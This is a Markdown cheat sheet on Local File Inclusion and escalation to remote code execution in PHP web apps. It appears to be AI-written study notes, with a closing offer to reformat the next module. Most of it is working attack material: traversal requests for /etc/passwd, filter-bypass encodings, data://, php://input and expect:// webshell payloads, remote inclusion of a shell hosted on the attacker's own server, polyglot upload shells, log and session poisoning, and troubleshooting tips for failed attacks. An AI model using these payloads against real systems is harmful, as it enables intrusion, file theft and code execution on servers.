

---

```md
## 🧠 Local File Inclusion (LFI) & RCE Cheat Sheet

---

### 🎯 1. Core Concept

> [!INFO]
> **Goal:** Read sensitive files from the server's local filesystem, and ideally escalate to Remote Code Execution (RCE).
> **Mechanism:** Exploit insecure file inclusion functions (e.g., `include()`, `require()`) that dynamically construct file paths using unsanitized user input.

---

### 🧪 2. Basic Detection & Path Traversal

Start by attempting to read universal files like `/etc/passwd` (Linux) or `C:\Windows\win.ini` (Windows).

```http
# Basic absolute path
/index.php?language=/etc/passwd

# Standard path traversal (Linux)
/index.php?language=../../../../etc/passwd

# Path traversal with name prefix bypass
/index.php?language=/../../../etc/passwd

# Path traversal bypassing "approved" directory checks
/index.php?language=./languages/../../../../etc/passwd
```

> [!CHECK]  
> Look for the `root:x:0:0:root:/root:/bin/bash` line in the response. If the page breaks or returns a 500 error, the file might be reading successfully but breaking the PHP syntax (a good sign for RCE escalation).

---

### 🧬 3. Filter Bypass Techniques

When basic traversal is blocked by WAFs or naive filters, use these evasion methods.

#### 🔹 Encoding & Obfuscation
```http
# Double URL encoding
/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Standard URL encoding
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double-dot slash bypass (filters replacing "../" with "")
/index.php?language=....//....//....//....//etc/passwd
```

#### 🔹 PHP Wrappers (The Gold Standard)
Read source code without executing it, bypassing extension checks.
```http
# Base64 encode the file to prevent execution and read source
/index.php?language=php://filter/read=convert.base64-encode/resource=config.php
```

#### 🔹 Legacy/Obsolete Bypasses (Context Dependent)
> [!ATTENTION]  
> **Null Byte (`%00`)** and **Path Truncation** only work on **PHP < 5.3.4**. Modern PHP null-terminates strings safely. Only use these if you confirm an older PHP version.
```http
# Null byte injection (bypasses appended ".php")
/index.php?language=../../../../etc/passwd%00

# Path truncation (requires ~2048+ characters of garbage)
/index.php?language=../../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

---

### 💥 4. LFI to RCE Escalation

Reading files is good; executing code is better. Use these vectors if you have LFI.

#### 🔹 PHP Wrappers (Direct Execution)
```http
# Data Wrapper (Inject code directly in URL)
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# Input Wrapper (Send payload in POST body)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>/index.php?language=php://input&cmd=id"

# Expect Wrapper (Requires PHP expect extension, rare but powerful)
curl -s "http://<SERVER_IP>/index.php?language=expect://id"
```

#### 🔹 Remote File Inclusion (RFI)
If `allow_url_include=On` in `php.ini`:
```bash
# 1. Host shell on attacker machine
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# 2. Include it from the target
/index.php?language=http://<OUR_IP>/shell.php&cmd=id
```

#### 🔹 LFI + File Upload
If you can upload files, upload a polyglot or malicious archive and include it.
```bash
# Malicious Image (Bypasses basic magic byte checks)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# Exploit: /index.php?language=./profile_images/shell.gif&cmd=id

# ZIP Wrapper
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
# Exploit: /index.php?language=zip://shell.zip%23shell.php&cmd=id

# PHAR Wrapper
php --define phar.readonly=0 -r 'new Phar("shell.phar");' # (Simplified generation)
# Exploit: /index.php?language=phar://./profile_images/shell.jpg/shell.txt&cmd=id
```

#### 🔹 Log Poisoning
Inject PHP code into a log file, then include the log file to execute it.

**Method A: PHP Session Poisoning**
```http
# 1. Set your session cookie to contain PHP code (via Burp or curl)
Cookie: PHPSESSID=<?php system($_GET["cmd"]); ?>
## check this loc to see the session page if available
/var/lib/php/sessions/sess_<phpsessid>

# 2. Include the session file (find session ID in your cookie)
/index.php?language=/var/lib/php/sessions/sess_<YOUR_SESSION_ID>&cmd=id
```

**Method B: Web Server Log Poisoning (Apache/Nginx)**
```bash
# 1. Poison the User-Agent in access.log
curl -s "http://<SERVER_IP>/index.php" -A '<?php system($_GET["cmd"]); ?>'

# 2. Include the access log
/index.php?language=/var/log/apache2/access.log&cmd=id
# (Paths vary: /var/log/nginx/access.log, /var/log/httpd/access_log)
# other logs for other service 
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
```

---

### 🔍 5. Discovery & Fuzzing Workflow

> [!SUCCESS] **Automated Recon with `ffuf`**

```bash
# 1. Fuzz for hidden parameters that might be vulnerable
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>/index.php?FUZZ=value' -fs 2287

# 2. Fuzz known LFI payloads against a suspected parameter
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>/index.php?language=FUZZ' -fs 2287

# 3. Fuzz the webroot path to find the correct number of "../"
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>/index.php?language=../../../../FUZZ/index.php' -fs 2287

# 4. Fuzz for sensitive server configuration files
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>/index.php?language=../../../../FUZZ' -fs 2287
```
> [!ABSTRACT] **Key Wordlists**
> - `LFI-Jhaddix.txt` (Comprehensive LFI payloads)
> - `default-web-root-directory-linux.txt` / `windows.txt`
> - `Server configurations wordlist` (e.g., `apache2.conf`, `nginx.conf`)

---

### 🧠 6. Language-Specific Inclusion Matrix

Know your target's backend. Not all inclusion functions behave the same way.

| Language | Function | Read Content | Execute Code | Remote URL |
| :--- | :--- | :---: | :---: | :---: |
| **PHP** | `include()` / `include_once()` | ✅ Yes | ✅ Yes | ✅ Yes |
| **PHP** | `require()` / `require_once()` | ✅ Yes | ✅ Yes | ❌ No* |
| **PHP** | `file_get_contents()` | ✅ Yes | ❌ No | ✅ Yes |
| **PHP** | `fopen()` / `file()` | ✅ Yes | ❌ No | ❌ No |
| **NodeJS** | `fs.readFile()` / `fs.sendFile()`| ✅ Yes | ❌ No | ❌ No |
| **NodeJS** | `res.render()` (Template Engines)| ✅ Yes | ✅ Yes | ❌ No |
| **Java** | `<%@ include file="..." %>` | ✅ Yes | ❌ No | ❌ No |
| **Java** | `<jsp:include page="..." />` | ✅ Yes | ✅ Yes | ✅ Yes |
| **.NET** | `@Html.Partial()` | ✅ Yes | ❌ No | ❌ No |
| **.NET** | `@Html.RemotePartial()` | ✅ Yes | ❌ No | ✅ Yes |
| **.NET** | `Response.WriteFile()` | ✅ Yes | ❌ No | ❌ No |

*\*Note: `require` can sometimes load remote files depending on PHP version and `allow_url_include` settings, but traditionally it is local-only in modern configurations.*

---

## ⚠️ Operator Notes

> [!FAILURE]

If LFI fails or behaves unexpectedly:
- **Wrong number of `../`**: You haven't reached the root directory yet. Use the webroot fuzzing `ffuf` command.
- **Appended extensions**: The backend does `include($_GET['page'] . '.php')`. Use **PHP Filters** (`php://filter/...`) or **Null Bytes** (if PHP < 5.3.4) to strip it.
- **Permission Denied**: You are reading a file, but the web server user (e.g., `www-data`) lacks read permissions. Pivot to log poisoning or readable world-readable files (`/etc/passwd`, `/proc/self/environ`).
- **RCE not triggering**: Ensure your injected PHP code is syntactically valid and the log/session file isn't being URL-encoded by the server before inclusion.

---

> [!ATTENTION]

**The LFI to RCE Pivot:**  
LFI is rarely the end goal. Always ask: *"Can I control a file on this system?"*  
If yes → Upload polyglot / Poison logs / Poison sessions → Include it → **RCE**.
```

---

### 🔥 Ready for the next target.
This LFI/RCE sheet is locked in. Drop the next module text (e.g., **SSRF**, **SSTI**, **Command Injection**, **IDOR**) and I will compress it into this exact same high-yield, Obsidian-ready format. 🎯